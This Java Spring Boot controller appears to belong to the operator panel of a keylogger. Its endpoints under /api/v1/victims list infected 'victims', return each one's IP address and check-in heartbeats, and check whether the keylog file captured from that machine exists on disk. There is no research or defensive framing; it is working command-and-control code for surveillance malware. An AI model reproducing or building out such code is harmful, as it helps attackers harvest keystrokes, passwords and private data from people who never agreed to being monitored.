package org.example.Controllers;

import lombok.RequiredArgsConstructor;
import org.example.Entities.Heartbeat;
import org.example.Entities.Victim;
import org.example.Services.VictimsService;
import org.springframework.http.ResponseEntity;
import org.springframework.security.access.prepost.PreAuthorize;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import java.io.File;
import java.util.List;
import java.util.Optional;
import java.util.stream.Collectors;

@RestController
@RequestMapping("/api/v1/victims")
@RequiredArgsConstructor
public class VictimsController {

    private final VictimsService victimService;

    @GetMapping
    @PreAuthorize("hasRole('USER')")
    public List<Victim> getAllVictims() {
        return victimService.getAllVictims();
    }

    @GetMapping("/{victimId}")
    @PreAuthorize("hasRole('USER')")
    public ResponseEntity<Victim> getVictim(@PathVariable Long victimId) {
        Optional<Victim> opt = victimService.getVictim(victimId);
        if (opt.isEmpty()) {
            return ResponseEntity.notFound().build();
        }
        
        Victim victim = opt.get();
        Victim dto = new Victim();
        dto.setId(victim.getId());
        dto.setIpAddress(victim.getIpAddress());
        
        if (victim.getHeartbeats() != null) {
            List<Heartbeat> mapped = victim.getHeartbeats().stream()
                    .map(h -> {
                        if (h.getKeyLogFilePath() == null) {
                            h.setEmptyFile(true);
                        } else {
                            File f = new File(h.getKeyLogFilePath());
                            if (!f.exists() || f.length() == 0) {
                                h.setEmptyFile(true);
                            }
                        }
                        return h;
                    })
                    .collect(Collectors.toList());
            dto.setHeartbeats(mapped);
        }
        
        return ResponseEntity.ok(dto);
    }

}
